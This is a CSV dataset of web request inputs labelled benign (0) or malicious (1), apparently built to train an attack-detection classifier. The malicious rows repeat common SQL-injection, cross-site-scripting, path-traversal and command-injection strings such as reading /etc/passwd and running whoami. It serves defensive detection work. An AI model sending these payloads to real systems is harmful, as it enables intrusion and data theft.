payload,label
/cart?session=73337,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
4OBUOV09LuY,0
/dashboard?session=27607,0
<script>var a=903;alert(a)</script>,1
<script>var a=28;alert(a)</script>,1
' OR 8=6 --,1
' OR 5=1 --,1
' OR 7=8 --,1
/index?id=3327,0
/profile?id=9913,0
../../../../etc/passwd,1
1' o r '1'='1,1
cart,0
1' o r '1'='1,1
| whoami,1
/checkout?id=9803,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
admin%00' OR 1=1,1
about,0
/register?session=30399,0
Y9ofUdcxmPMg,0
onerror=alert(1),1
/dashboard?session=89067,0
/dashboard?id=6641,0
/home?id=8732,0
/about?id=4116,0
/settings?id=5580,0
/contact?id=9912,0
register,0
/search?id=4924,0
../../../windows/win.ini,1
' OR '1'='1,1
admin%00' OR 1=1,1
| whoami,1
<script>var a=401;alert(a)</script>,1
<script>var a=684;alert(a)</script>,1
onerror=alert(1),1
javascript:alert(1),1
' OR 4=9 --,1
' OR 1=7 --,1
<script>var a=944;alert(a)</script>,1
JEUsEXlJTEgFElb,0
' OR 6=1 --,1
<script>var a=75;alert(a)</script>,1
s1htT0DKpPvVc,0
<script>var a=997;alert(a)</script>,1
cart,0
/contact?session=18061,0
/home?id=9352,0
' OR 5=8 --,1
s E l E c T * f R o M a d m i n,1
<script>var a=171;alert(a)</script>,1
' OR '1'='1,1
| whoami,1
' OR 4=3 --,1
user,0
' OR 1=1 --,1
4RJWqNsGu4I58C,0
blog,0
' OR 1=1 --,1
1' o r '1'='1,1
<script>alert(document.cookie)</script>,1
/dashboard?id=319,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
| whoami,1
<script>var a=530;alert(a)</script>,1
/about?session=64194,0
admin%00' OR 1=1,1
<script>var a=775;alert(a)</script>,1
admin'/* bypass */OR 1=1,1
/register?session=85752,0
' OR '1'='1,1
| whoami,1
' OR 6=6 --,1
' OR 8=9 --,1
register,0
login,0
../../../windows/win.ini,1
profile,0
/cart?session=11242,0
' OR 1=1 --,1
' OR 1=3 --,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
blog,0
vBSZsFmm,0
/about?session=90010,0
' OR 1=1 --,1
login,0
' OR '1'='1,1
' OR 7=3 --,1
1' o r '1'='1,1
cart,0
onerror=alert(1),1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
p7gkgF8IsLXL6,0
zZ8UowrH5XvBMa6,0
admin'/* bypass */OR 1=1,1
index,0
<script>var a=209;alert(a)</script>,1
' OR 3=4 --,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
<script>alert(document.cookie)</script>,1
<script>var a=986;alert(a)</script>,1
<script>alert(document.cookie)</script>,1
' OR 4=9 --,1
/settings?id=7127,0
../../../windows/win.ini,1
settings,0
1' o r '1'='1,1
register,0
../../../windows/win.ini,1
| whoami,1
/about?id=5874,0
admin'/* bypass */OR 1=1,1
/home?id=3783,0
../../../windows/win.ini,1
/cart?id=3218,0
/home?id=8210,0
s E l E c T * f R o M a d m i n,1
/settings?id=8229,0
' OR 1=1 --,1
onerror=alert(1),1
<script>var a=14;alert(a)</script>,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
YXWwCMSZJKoEn,0
index,0
/cart?session=92162,0
/about?id=4787,0
onerror=alert(1),1
' OR 8=3 --,1
' OR 2=2 --,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
admin'/* bypass */OR 1=1,1
admin' --,1
XYWabMoiD323y,0
/profile?session=22463,0
Li9TJGWxPdR,0
/login?id=40,0
../../../windows/win.ini,1
/login?session=61424,0
onerror=alert(1),1
NzRzVAmWZzq9x3u,0
/register?id=2030,0
/settings?session=30471,0
<script>var a=607;alert(a)</script>,1
/blog?id=5595,0
' OR 1=1 --,1
/profile?session=32760,0
onerror=alert(1),1
' OR 4=7 --,1
/index?id=1062,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
6E84zSlNcee0nn,0
/profile?id=3927,0
/blog?session=60429,0
admin%00' OR 1=1,1
s E l E c T * f R o M a d m i n,1
search,0
/cart?id=1877,0
settings,0
Kjpmm0TpCpmCw,0
/login?session=49636,0
' OR 3=9 --,1
admin'/* bypass */OR 1=1,1
admin%00' OR 1=1,1
/checkout?session=77993,0
../../../windows/win.ini,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>var a=462;alert(a)</script>,1
javascript:alert(1),1
/profile?session=86066,0
/dashboard?id=1622,0
/user?session=60791,0
../../../../etc/passwd,1
../../../../etc/passwd,1
zSVXltR7aj,0
1' o r '1'='1,1
admin' --,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
/blog?session=88881,0
user,0
/login?session=40696,0
/checkout?id=7648,0
; cat /etc/passwd,1
<script>var a=245;alert(a)</script>,1
index,0
; cat /etc/passwd,1
/register?session=98533,0
/register?session=96339,0
/about?id=829,0
admin' --,1
onerror=alert(1),1
checkout,0
/blog?session=31524,0
/about?id=2119,0
/user?id=517,0
dashboard,0
/blog?id=5608,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/search?id=6549,0
' OR 1=7 --,1
| whoami,1
cart,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
s E l E c T * f R o M a d m i n,1
' OR 1=1 --,1
/contact?session=80182,0
profile,0
cart,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
' OR 1=1 --,1
<script>var a=828;alert(a)</script>,1
profile,0
/login?id=7805,0
s E l E c T * f R o M a d m i n,1
admin' --,1
; cat /etc/passwd,1
WhYaLgy3jwsyxWd,0
admin'/* bypass */OR 1=1,1
/checkout?id=1488,0
/register?session=59000,0
/checkout?id=7851,0
admin'/* bypass */OR 1=1,1
/cart?id=5264,0
admin'/* bypass */OR 1=1,1
8beBtpxzbXnrWqy,0
/contact?session=59552,0
' OR 5=2 --,1
jVeg2rUXccJ6lR,0
2ephFXHApnEc,0
about,0
contact,0
1' o r '1'='1,1
<script>var a=201;alert(a)</script>,1
/register?session=83597,0
' OR 1=1 --,1
/contact?session=46419,0
| whoami,1
javascript:alert(1),1
<script>alert(document.cookie)</script>,1
admin%00' OR 1=1,1
<script>alert(document.cookie)</script>,1
onerror=alert(1),1
wGWtgXRqZI,0
' OR 3=7 --,1
/blog?session=35765,0
' OR 5=6 --,1
/index?id=2359,0
/home?session=52170,0
profile,0
<script>var a=873;alert(a)</script>,1
user,0
/index?session=40000,0
zaqgzEa7iE4Erj,0
login,0
/dashboard?id=8437,0
' OR '1'='1,1
index,0
s E l E c T * f R o M a d m i n,1
' OR 3=6 --,1
<script>var a=466;alert(a)</script>,1
/checkout?id=1617,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
/home?session=42145,0
/checkout?id=6595,0
onerror=alert(1),1
/checkout?session=88974,0
' OR '1'='1,1
' OR 5=7 --,1
/checkout?id=8014,0
' OR 4=8 --,1
/contact?id=2010,0
/user?session=87230,0
mLEaGeAGytyvQsD,0
blog,0
<script>var a=772;alert(a)</script>,1
; cat /etc/passwd,1
<script>var a=221;alert(a)</script>,1
<script>alert(document.cookie)</script>,1
javascript:alert(1),1
' OR 6=5 --,1
../../../windows/win.ini,1
/checkout?session=64444,0
/register?id=5656,0
/contact?session=55346,0
<script>var a=323;alert(a)</script>,1
' OR 9=2 --,1
/search?session=90276,0
checkout,0
/cart?session=49285,0
blog,0
/user?session=28115,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
admin'/* bypass */OR 1=1,1
/login?session=12430,0
about,0
<script>var a=646;alert(a)</script>,1
/about?session=61684,0
settings,0
<script>var a=552;alert(a)</script>,1
1' o r '1'='1,1
' OR '1'='1,1
1' o r '1'='1,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
/settings?session=76784,0
/home?session=27137,0
' OR 1=1 --,1
| whoami,1
V6MeQvXw2cHz,0
/search?id=5954,0
/settings?id=6299,0
/register?id=1259,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>var a=40;alert(a)</script>,1
<script>var a=513;alert(a)</script>,1
<script>var a=386;alert(a)</script>,1
login,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
admin%00' OR 1=1,1
blog,0
/register?id=6635,0
cart,0
contact,0
/settings?id=9060,0
/login?session=15475,0
<script>var a=316;alert(a)</script>,1
; cat /etc/passwd,1
/dashboard?id=2076,0
D6YD3L4HmZ,0
/home?id=4089,0
/about?session=67987,0
/contact?id=1429,0
../../../../etc/passwd,1
ahtB4kgUp9,0
<script>var a=893;alert(a)</script>,1
' OR 5=7 --,1
admin' --,1
/index?session=67506,0
../../../windows/win.ini,1
9OVcn8eTic5,0
/register?session=55581,0
<script>var a=400;alert(a)</script>,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
search,0
<script>alert(document.cookie)</script>,1
' OR 7=8 --,1
/home?id=1055,0
javascript:alert(1),1
/checkout?session=51283,0
admin' --,1
admin' --,1
admin' --,1
index,0
profile,0
admin' --,1
/home?id=9522,0
<script>alert(document.cookie)</script>,1
index,0
/user?session=64082,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
register,0
' OR '1'='1,1
Y10kPEEKdEvF,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
' OR 8=1 --,1
' OR 8=3 --,1
/contact?session=70846,0
/cart?id=9221,0
' OR '1'='1,1
/index?session=47301,0
/about?session=16484,0
' OR '1'='1,1
onerror=alert(1),1
U N I O N   S E L E C T   * F R O M   u s e r s,1
login,0
../../../windows/win.ini,1
admin' --,1
../../../windows/win.ini,1
FkeYema4UWG7,0
VKJyWZg3JKPh5,0
<script>var a=803;alert(a)</script>,1
; cat /etc/passwd,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
/login?session=50977,0
../../../windows/win.ini,1
QzZQxSOLmYisDu8,0
' OR 6=2 --,1
admin%00' OR 1=1,1
../../../../etc/passwd,1
3CyYQfBVT,0
/profile?id=5919,0
<script>var a=482;alert(a)</script>,1
/register?id=1454,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
bmPVxIMtruyI,0
<script>var a=820;alert(a)</script>,1
' OR 9=7 --,1
<script>alert(document.cookie)</script>,1
/login?session=48875,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>var a=263;alert(a)</script>,1
' OR 1=4 --,1
/blog?id=3595,0
cart,0
evFMaNyGvHdVTfM,0
settings,0
1' o r '1'='1,1
<script>var a=332;alert(a)</script>,1
; cat /etc/passwd,1
' OR 8=3 --,1
aIijsR65B,0
<script>var a=708;alert(a)</script>,1
register,0
<script>var a=70;alert(a)</script>,1
/search?id=859,0
/index?session=21612,0
PlezNaBgZxO,0
admin%00' OR 1=1,1
| whoami,1
' OR 5=4 --,1
/user?session=87050,0
8BtkO0sDXlCL73P,0
JBfAFM6rzwUnw,0
/about?id=1916,0
/cart?id=9566,0
cart,0
AHjQDVldO,0
; cat /etc/passwd,1
' OR 1=1 --,1
../../../../etc/passwd,1
contact,0
blog,0
/blog?session=42227,0
' OR 3=4 --,1
<script>var a=69;alert(a)</script>,1
/index?session=65313,0
<script>var a=640;alert(a)</script>,1
<script>var a=886;alert(a)</script>,1
/index?session=52606,0
/user?id=8,0
admin%00' OR 1=1,1
atw0OHkvGhOaaZa,0
; cat /etc/passwd,1
/dashboard?session=70840,0
' OR 1=1 --,1
<script>var a=634;alert(a)</script>,1
' OR 2=5 --,1
<script>alert(document.cookie)</script>,1
checkout,0
onerror=alert(1),1
' OR 9=4 --,1
/index?id=1300,0
<script>alert(document.cookie)</script>,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
; cat /etc/passwd,1
/cart?id=6079,0
user,0
gsUfMHqdZuWfhgk,0
' OR 9=5 --,1
/search?session=92219,0
onerror=alert(1),1
admin' --,1
dashboard,0
/user?id=2119,0
<script>var a=189;alert(a)</script>,1
/profile?id=4572,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
../../../windows/win.ini,1
' OR 1=5 --,1
../../../../etc/passwd,1
/index?session=80922,0
P3bcCwWXVc,0
javascript:alert(1),1
| whoami,1
| whoami,1
4fuEmzgQ,0
' OR 4=2 --,1
admin' --,1
' OR 2=9 --,1
admin'/* bypass */OR 1=1,1
login,0
' OR 8=9 --,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
' OR '1'='1,1
' OR 3=1 --,1
admin' --,1
register,0
' OR 1=8 --,1
<script>var a=184;alert(a)</script>,1
onerror=alert(1),1
settings,0
1' o r '1'='1,1
/user?id=5654,0
/contact?session=23406,0
| whoami,1
' OR 9=5 --,1
admin' --,1
' OR 1=1 --,1
| whoami,1
wmxOCv8rEo1Vw,0
<script>var a=1;alert(a)</script>,1
1' o r '1'='1,1
ZrMdNlsmlZ2g1s,0
admin'/* bypass */OR 1=1,1
admin'/* bypass */OR 1=1,1
/checkout?id=671,0
<script>var a=751;alert(a)</script>,1
4yAl5RIt,0
../../../windows/win.ini,1
aDtjE6nLu5e,0
admin' --,1
<script>var a=553;alert(a)</script>,1
javascript:alert(1),1
<script>var a=389;alert(a)</script>,1
IWPATmKtffmJ,0
| whoami,1
<script>alert(document.cookie)</script>,1
onerror=alert(1),1
<script>var a=668;alert(a)</script>,1
/profile?session=97499,0
checkout,0
<script>var a=454;alert(a)</script>,1
/checkout?session=12121,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
admin%00' OR 1=1,1
' OR 4=5 --,1
/dashboard?id=7788,0
' OR 1=1 --,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/profile?id=8697,0
admin%00' OR 1=1,1
index,0
TnMBUCaVvl,0
SQdHIBhymdB7N,0
home,0
onerror=alert(1),1
admin'/* bypass */OR 1=1,1
search,0
s E l E c T * f R o M a d m i n,1
hfYVArSSRL7,0
/settings?id=974,0
cart,0
' OR 7=5 --,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
1' o r '1'='1,1
<script>var a=520;alert(a)</script>,1
<script>alert(document.cookie)</script>,1
/dashboard?id=1572,0
admin' --,1
register,0
/blog?session=55841,0
/home?session=89050,0
register,0
<script>var a=713;alert(a)</script>,1
<script>var a=280;alert(a)</script>,1
/register?id=1522,0
' OR 1=1 --,1
onerror=alert(1),1
../../../../etc/passwd,1
gAakeLjxgVtOzKg,0
../../../windows/win.ini,1
/home?session=87480,0
<script>var a=520;alert(a)</script>,1
admin'/* bypass */OR 1=1,1
ZChZnhhgIj,0
' OR 2=5 --,1
admin'/* bypass */OR 1=1,1
' OR 4=5 --,1
JZOZTLQaxrPiPe,0
/profile?session=48232,0
dashboard,0
| whoami,1
/register?id=6229,0
UMERfXSufY3,0
; cat /etc/passwd,1
/login?id=7740,0
1' o r '1'='1,1
/search?id=8400,0
/login?id=6572,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/user?id=2486,0
| whoami,1
s E l E c T * f R o M a d m i n,1
LvMLT2Qy,0
contact,0
admin%00' OR 1=1,1
; cat /etc/passwd,1
TroohRb4IHr,0
admin' --,1
search,0
' OR '1'='1,1
../../../windows/win.ini,1
<script>var a=772;alert(a)</script>,1
checkout,0
; cat /etc/passwd,1
GnJOFpjwhM,0
checkout,0
v5FMQ83zIaxU,0
profile,0
<script>alert(document.cookie)</script>,1
m6KGjPETz,0
admin'/* bypass */OR 1=1,1
onerror=alert(1),1
admin'/* bypass */OR 1=1,1
javascript:alert(1),1
Qxn1et8WwEDjnXs,0
/login?session=94212,0
contact,0
' OR '1'='1,1
' OR 1=1 --,1
<script>var a=732;alert(a)</script>,1
<script>var a=903;alert(a)</script>,1
../../../../etc/passwd,1
/blog?id=8478,0
' OR 3=4 --,1
/search?session=83006,0
checkout,0
<script>var a=637;alert(a)</script>,1
YE1kYORYo0v7,0
<script>var a=785;alert(a)</script>,1
17G0OFcH,0
' OR 1=1 --,1
/cart?session=42199,0
/register?session=60002,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
admin' --,1
6NLS8vsmCYwG0t,0
../../../windows/win.ini,1
/about?session=23433,0
/dashboard?session=71355,0
/user?id=5586,0
/user?id=283,0
/search?id=8345,0
4QQfbKxwyx,0
../../../../etc/passwd,1
<script>var a=896;alert(a)</script>,1
; cat /etc/passwd,1
9mnbNbbvBiH,0
../../../../etc/passwd,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
checkout,0
; cat /etc/passwd,1
mVeYEu3IwU3Zf,0
' OR 1=1 --,1
admin'/* bypass */OR 1=1,1
/login?session=58413,0
/home?id=7586,0
| whoami,1
' OR 6=2 --,1
/profile?id=3316,0
/settings?session=19312,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
' OR 1=1 --,1
<script>var a=795;alert(a)</script>,1
/user?session=67456,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
cart,0
admin' --,1
oifMpHMFe,0
cart,0
yhUKb2QdEyHD,0
/checkout?session=92455,0
/contact?session=37737,0
admin'/* bypass */OR 1=1,1
settings,0
admin' --,1
settings,0
admin' --,1
/login?session=90586,0
checkout,0
onerror=alert(1),1
cgBj4vss,0
s E l E c T * f R o M a d m i n,1
/login?session=29236,0
<script>var a=786;alert(a)</script>,1
cart,0
/home?id=1,0
/user?id=5256,0
register,0
admin'/* bypass */OR 1=1,1
| whoami,1
' OR 1=1 --,1
<script>alert(document.cookie)</script>,1
| whoami,1
<script>var a=161;alert(a)</script>,1
/cart?id=5477,0
/cart?id=6796,0
l81E686L,0
search,0
<script>var a=417;alert(a)</script>,1
/settings?session=21870,0
/about?id=5608,0
' OR '1'='1,1
/blog?id=6840,0
admin' --,1
; cat /etc/passwd,1
<script>var a=388;alert(a)</script>,1
/login?session=45213,0
<script>var a=500;alert(a)</script>,1
../../../../etc/passwd,1
/register?id=3666,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
onerror=alert(1),1
../../../../etc/passwd,1
cart,0
login,0
user,0
cart,0
Zj9BcbBO3M,0
/profile?session=46863,0
user,0
/index?id=1696,0
' OR 9=8 --,1
; cat /etc/passwd,1
/user?id=6898,0
../../../windows/win.ini,1
' OR '1'='1,1
/blog?id=5129,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
user,0
../../../../etc/passwd,1
' OR '1'='1,1
/index?session=77378,0
/search?session=87053,0
' OR '1'='1,1
/contact?id=2687,0
<script>alert(document.cookie)</script>,1
<script>var a=464;alert(a)</script>,1
/cart?session=74480,0
Pq5hhHyu24Otl,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
YpcpRFmh0ZoJ,0
' OR 3=1 --,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
txvrMo20eq,0
s E l E c T * f R o M a d m i n,1
QPAIkHbVJ,0
home,0
' OR '1'='1,1
; cat /etc/passwd,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
' OR 4=8 --,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
' OR 8=4 --,1
' OR '1'='1,1
admin' --,1
' OR 9=8 --,1
onerror=alert(1),1
/about?session=56767,0
MrI2NSSVLw,0
index,0
fF5Ltp1yEWla5,0
../../../windows/win.ini,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
aGYW81FH7u6,0
s E l E c T * f R o M a d m i n,1
<script>var a=348;alert(a)</script>,1
/index?session=97484,0
e2HZg1tpWWn,0
1' o r '1'='1,1
javascript:alert(1),1
qX2cHLqPUbphe9P,0
register,0
/register?id=8571,0
' OR 6=7 --,1
cart,0
/cart?id=7338,0
/user?session=87919,0
' OR 2=7 --,1
/profile?id=5738,0
/dashboard?session=94744,0
DgxV7FrSKBob,0
admin'/* bypass */OR 1=1,1
cart,0
' OR 1=5 --,1
' OR 1=1 --,1
profile,0
s E l E c T * f R o M a d m i n,1
s E l E c T * f R o M a d m i n,1
s E l E c T * f R o M a d m i n,1
/contact?id=6514,0
' OR 9=1 --,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/login?id=6931,0
' OR 4=1 --,1
admin' --,1
admin' --,1
home,0
contact,0
9hQPl6Av1k2a,0
Zyn1XXg8,0
<script>var a=79;alert(a)</script>,1
<script>alert(document.cookie)</script>,1
' OR 4=1 --,1
Ynfu4WCq,0
admin' --,1
/dashboard?id=7468,0
<script>var a=597;alert(a)</script>,1
profile,0
/search?session=19332,0
s E l E c T * f R o M a d m i n,1
/login?session=74666,0
' OR 6=4 --,1
| whoami,1
<script>var a=257;alert(a)</script>,1
715SBfo7M,0
<script>alert(document.cookie)</script>,1
about,0
cart,0
; cat /etc/passwd,1
/about?session=56089,0
/search?session=44596,0
checkout,0
' OR 6=2 --,1
/dashboard?id=8760,0
/home?session=44389,0
onerror=alert(1),1
/login?id=741,0
' OR 1=1 --,1
onerror=alert(1),1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
home,0
| whoami,1
/index?session=94812,0
' OR 8=6 --,1
/blog?session=47380,0
s E l E c T * f R o M a d m i n,1
admin'/* bypass */OR 1=1,1
uTpXvqNbZoFg,0
settings,0
admin'/* bypass */OR 1=1,1
/blog?id=3461,0
admin%00' OR 1=1,1
/about?session=57050,0
javascript:alert(1),1
C8x8iXZnOmm9vd,0
/register?id=4375,0
../../../../etc/passwd,1
mAx550tbP0YS7E,0
javascript:alert(1),1
; cat /etc/passwd,1
/register?id=5950,0
/register?session=30243,0
/search?id=3689,0
' OR 4=2 --,1
/search?id=8600,0
/register?id=4837,0
dashboard,0
admin' --,1
' OR 2=4 --,1
s E l E c T * f R o M a d m i n,1
B0iQS3D8T,0
' OR 9=1 --,1
| whoami,1
checkout,0
about,0
/index?id=1956,0
/index?id=548,0
home,0
<script>var a=912;alert(a)</script>,1
blog,0
j1LNo2W95PxZjKI,0
/blog?session=27743,0
<script>var a=332;alert(a)</script>,1
about,0
' OR 5=9 --,1
register,0
| whoami,1
' OR 6=9 --,1
' OR 7=6 --,1
<script>alert(document.cookie)</script>,1
i1UN4VZvz,0
home,0
onerror=alert(1),1
/login?id=8606,0
/contact?id=8939,0
; cat /etc/passwd,1
/index?id=7802,0
' OR 8=2 --,1
admin' --,1
| whoami,1
DSWaoVCcyZNRTeG,0
admin%00' OR 1=1,1
/home?session=82987,0
<script>var a=452;alert(a)</script>,1
javascript:alert(1),1
onerror=alert(1),1
settings,0
' OR 1=1 --,1
<script>var a=313;alert(a)</script>,1
../../../windows/win.ini,1
/contact?session=35778,0
/register?id=7990,0
' OR 5=9 --,1
' OR 1=1 --,1
AapFJaI5tX,0
lfVNuauZKUY,0
<script>alert(document.cookie)</script>,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/contact?id=8281,0
1' o r '1'='1,1
/contact?session=16013,0
' OR 8=1 --,1
/index?session=98165,0
profile,0
/register?session=29320,0
/user?session=97027,0
; cat /etc/passwd,1
1' o r '1'='1,1
<script>var a=631;alert(a)</script>,1
search,0
../../../windows/win.ini,1
<script>var a=131;alert(a)</script>,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/login?session=22192,0
/dashboard?session=17912,0
' OR 4=7 --,1
<script>var a=827;alert(a)</script>,1
/cart?session=57655,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
admin%00' OR 1=1,1
| whoami,1
contact,0
<script>var a=35;alert(a)</script>,1
8f9TYpjn4,0
' OR 7=6 --,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/index?session=98691,0
s E l E c T * f R o M a d m i n,1
K462N91xe7,0
admin%00' OR 1=1,1
' OR 1=1 --,1
profile,0
' OR 9=4 --,1
/checkout?session=78267,0
jUYckCWPQ9AOyex,0
admin'/* bypass */OR 1=1,1
CwHqmoj3hMUrKy,0
blog,0
' OR '1'='1,1
ZxjqDEchlm1s,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
admin'/* bypass */OR 1=1,1
; cat /etc/passwd,1
/about?session=63955,0
; cat /etc/passwd,1
4WOPg5LH1HZzb,0
' OR '1'='1,1
/blog?id=5113,0
J31VJxXEFjw,0
PCQEVX2YiUmI,0
/dashboard?session=78033,0
javascript:alert(1),1
/checkout?id=1065,0
/contact?session=13430,0
/checkout?session=36840,0
<script>var a=709;alert(a)</script>,1
' OR 9=3 --,1
../../../windows/win.ini,1
profile,0
' OR '1'='1,1
about,0
VCvLLkSa7K0gv,0
/index?id=3752,0
1' o r '1'='1,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
<script>var a=877;alert(a)</script>,1
' OR 2=1 --,1
<script>var a=295;alert(a)</script>,1
1' o r '1'='1,1
profile,0
<script>var a=539;alert(a)</script>,1
' OR 9=2 --,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/profile?session=11932,0
admin' --,1
dashboard,0
onerror=alert(1),1
1' o r '1'='1,1
/index?id=9555,0
onerror=alert(1),1
onerror=alert(1),1
/index?id=5962,0
| whoami,1
/profile?id=6614,0
<script>var a=691;alert(a)</script>,1
Kio1cw2sXfh5QO,0
/about?id=2716,0
onerror=alert(1),1
gqNFZWWNSknlnB6,0
admin' --,1
' OR 5=2 --,1
/cart?session=84763,0
s6NP8PB7miI,0
' OR '1'='1,1
/home?session=35442,0
idfWMQ2g,0
| whoami,1
' OR 2=9 --,1
/dashboard?session=41583,0
/login?session=86761,0
' OR 2=9 --,1
' OR 5=8 --,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
checkout,0
/dashboard?id=3628,0
' OR '1'='1,1
' OR 8=4 --,1
blog,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
9vPLdJpNLQ,0
/register?session=48993,0
/contact?id=8290,0
/about?session=77704,0
/register?session=37568,0
<script>var a=67;alert(a)</script>,1
' OR 7=5 --,1
Ob79ZcdtbqI6,0
' OR 1=1 --,1
javascript:alert(1),1
<script>var a=640;alert(a)</script>,1
w9X1JnxEmQzsINA,0
; cat /etc/passwd,1
../../../windows/win.ini,1
../../../windows/win.ini,1
' OR 1=1 --,1
| whoami,1
settings,0
/profile?session=15667,0
/dashboard?id=8876,0
javascript:alert(1),1
/index?session=26359,0
' OR 2=7 --,1
<script>var a=296;alert(a)</script>,1
/search?session=69143,0
TzBgDrExoB,0
profile,0
cart,0
/cart?session=32972,0
RQLnck5g,0
<script>var a=742;alert(a)</script>,1
admin' --,1
<script>var a=517;alert(a)</script>,1
geUGQscl,0
/dashboard?id=974,0
; cat /etc/passwd,1
4Z16UJmnw7,0
/home?id=9759,0
' OR 2=7 --,1
' OR 9=6 --,1
register,0
/search?session=19661,0
../../../windows/win.ini,1
login,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>var a=571;alert(a)</script>,1
IlNLmKroBNnmK,0
/about?session=43263,0
/dashboard?id=376,0
admin'/* bypass */OR 1=1,1
/home?session=19409,0
/search?session=80206,0
index,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
o2WqGQMEcw,0
; cat /etc/passwd,1
<script>var a=780;alert(a)</script>,1
/login?session=62275,0
1' o r '1'='1,1
/settings?id=5849,0
1' o r '1'='1,1
/cart?session=58350,0
<script>var a=866;alert(a)</script>,1
2hyyy1nMO1Jx,0
../../../windows/win.ini,1
admin'/* bypass */OR 1=1,1
zIHfW1cV,0
' OR 5=4 --,1
/blog?session=38052,0
<script>var a=325;alert(a)</script>,1
javascript:alert(1),1
../../../../etc/passwd,1
/profile?id=6295,0
/checkout?session=76220,0
admin'/* bypass */OR 1=1,1
' OR 9=6 --,1
3YM2yxOQusxR1r,0
' OR 5=2 --,1
<script>var a=163;alert(a)</script>,1
admin' --,1
/index?id=8232,0
